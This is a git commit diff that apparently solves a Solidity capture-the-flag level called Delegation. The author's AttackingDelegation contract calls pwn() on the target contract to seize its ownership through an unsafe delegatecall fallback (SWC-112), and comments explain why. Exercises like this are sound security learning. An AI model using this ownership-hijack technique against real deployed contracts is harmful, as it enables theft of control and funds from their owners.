b09b62619b645880ed8a4f397a7e1a5ea4518ae5
Vance Ingalls <vanceingalls@gmail.com>
2022-12-24 14:15:19 -0800

    delegation

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
+import "hardhat/console.sol";
 
 contract AttackingDelegation {
     address public contractAddress;
@@ -11,5 +12,12 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+        Delegation delegationContract = Delegation(contractAddress);
+        // https://swcregistry.io/docs/SWC-112
+        // had it as delegatecall before but that just attepmted to set the owner of this contract
+        // since msg.sender doesnt change in a delegatecall, pwn gets this contract address
+        // as msg.sender and uses the storage of delegationContract
+        (bool success,) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
+        console.log("hackContract success is %s", success);
     }
 }
